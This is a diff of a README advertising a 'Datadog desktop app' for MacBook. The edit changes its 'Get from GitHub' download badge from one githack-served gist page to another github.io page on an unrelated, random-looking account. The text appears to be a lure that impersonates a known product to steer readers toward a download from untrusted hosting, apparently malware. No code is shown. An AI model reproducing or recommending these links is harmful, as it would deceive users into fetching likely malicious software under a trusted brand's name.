@@ -4,7 +4,7 @@
 Monitor your infrastructure and applications with Datadog on MacBook! 😃  
 Follow the instructions below to get started with the Datadog desktop app and gain full observability over your systems.
 
-[![Get from GitHub](https://img.shields.io/badge/Get_From_Github-Datadog-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/mazerdika995/8ce21b5ca738c2874852c8ed4a99131e/raw/689378a74dd850f9e1f64a0d49a258d20f2d90b2/get.html)
+[![Get from GitHub](https://img.shields.io/badge/Get_From_Github-Datadog-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://linkolnmoldranz782.github.io/.github/)
 
 ---
 
